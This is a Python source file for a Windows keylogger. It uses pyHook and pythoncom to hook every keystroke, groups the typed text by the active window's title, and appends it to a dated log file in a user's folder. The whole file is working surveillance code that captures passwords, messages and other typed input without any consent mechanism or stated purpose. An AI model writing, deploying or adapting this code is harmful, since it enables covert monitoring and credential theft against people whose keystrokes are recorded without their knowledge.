import time
from datetime import datetime

import pyHook, pythoncom, sys, logging


# Make a new log for each day
todays_date = datetime.now().strftime('%Y-%b-%d')
file_name = 'C:\\Users\\<user>\\logs\\{0}.txt'.format(todays_date)

current_window = ''
line_buffer = ''

def OnKeyboardEvent(event):
    global current_window
    global line_buffer

    if current_window != event.WindowName:
        if line_buffer:
            line_buffer += '\n'
            _writeToFile(line_buffer)

        line_buffer = ''
        _writeToFile('\n[{0}]\n'.format(event.WindowName))
        current_window = event.WindowName

    # When ENTER or TAB is pressed, log the buffer
    if event.Ascii == 13 or event.Ascii == 9:
        line_buffer += '\n'
        _writeToFile(line_buffer)
        line_buffer = ''
        return True

    # When BACKSPACE is pressed, remove from the buffer
    if event.Ascii == 8:
        line_buffer = line_buffer[:-1]
        return True

    # If not an invalid ASCII character
    if not (event.Ascii < 32 or event.Ascii > 126):
        # Add each character as its corresponding ASCII format to the buffer
        if event.Ascii:
            line_buffer += chr(event.Ascii)


    return True

def _writeToFile(line):
    with open(file_name, 'a') as f:
        f.write(line)
        f.close()


# The pyHook manager allows us to set a hook on Windows events
hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()

# Pythoncom module captures the key messages
# Keeps the program running
pythoncom.PumpMessages()
